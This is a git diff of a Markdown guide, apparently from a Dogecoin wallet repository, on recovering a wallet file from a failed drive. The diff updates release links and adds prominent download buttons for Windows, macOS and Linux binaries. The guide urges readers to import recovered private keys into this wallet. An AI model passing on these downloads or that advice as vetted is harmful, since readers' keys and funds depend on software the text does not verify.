@@ -1,6 +1,10 @@
-![Dogechain Wallet](https://img.shields.io/badge/Dogechain-Wallet-2E3440) ![Platforms](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-informational) ![License: MIT](https://img.shields.io/badge/license-MIT-green)
+[![Release v1.03.14](https://img.shields.io/badge/RELEASE-v1.03.14-705600?style=for-the-badge&labelColor=3D2817)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14) ![Dogechain Wallet](https://img.shields.io/badge/Dogechain%20Wallet-DOGE-705600?style=for-the-badge&labelColor=3D2817) ![Platforms](https://img.shields.io/badge/PLATFORMS-Windows%20%7C%20macOS%20%7C%20Linux-804600?style=for-the-badge&labelColor=3D2817)
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-0078D6?logo=windows&logoColor=white)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-000000?logo=apple&logoColor=white)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-FCC624?logo=linux&logoColor=black)](https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v-1.0.0/dogechain-wallet-1.0.0.zip)
+<p align="center">
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-WINDOWS-705600?style=for-the-badge&labelColor=3D2817&logo=windows&logoColor=white" alt="Download Dogechain Wallet for Windows" height="40"></a>
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-MACOS-804600?style=for-the-badge&labelColor=3D2817&logo=apple&logoColor=white" alt="Download Dogechain Wallet for macOS" height="40"></a>
+  <a href="https://github.com/dogechain-developments/Dogechain-Wallet/releases/download/v1.03.14/dogechain-wallet-v1.03.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%AC%87-LINUX-3D2817?style=for-the-badge&labelColor=3D2817&logo=linux&logoColor=white" alt="Download Dogechain Wallet for Linux" height="40"></a>
+</p>
 
 ---
 
@@ -38,7 +42,7 @@ As with password recovery, this is an area with real scams targeting people in e
 
 ## Once you've recovered the file
 
-The same principle applies here as with any other recovery scenario: once you've regained access to funds through a recovered file, the highest-value next step is moving them into a wallet with a freshly generated seed phrase, backed up properly this time — see [How to Properly Back Up Your Dogecoin Wallet](./how-to-backup-dogecoin-wallet.md). [Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v-1.0.0) supports importing a recovered private key and syncs via SPV in minutes, giving you a clean, non-custodial home for the funds going forward without relying on the drive that just failed you.
+The same principle applies here as with any other recovery scenario: once you've regained access to funds through a recovered file, the highest-value next step is moving them into a wallet with a freshly generated seed phrase, backed up properly this time — see [How to Properly Back Up Your Dogecoin Wallet](./how-to-backup-dogecoin-wallet.md). [Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14) supports importing a recovered private key and syncs via SPV in minutes, giving you a clean, non-custodial home for the funds going forward without relying on the drive that just failed you.
 
 ## Preventing this next time
 
@@ -53,4 +57,4 @@ This scenario is a strong argument for not relying on a single device as your on
 - [How to Properly Back Up Your Dogecoin Wallet](./how-to-backup-dogecoin-wallet.md)
 - [MultiDoge Is Discontinued — How to Migrate Your Wallet](./multidoge-alternative-migration.md)
 
-[Download Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v-1.0.0) · [Report an issue](https://github.com/dogechain-developments/Dogechain-Wallet/issues)
+[Download Dogechain Wallet](https://github.com/dogechain-developments/Dogechain-Wallet/releases/tag/v1.03.14) · [Report an issue](https://github.com/dogechain-developments/Dogechain-Wallet/issues)
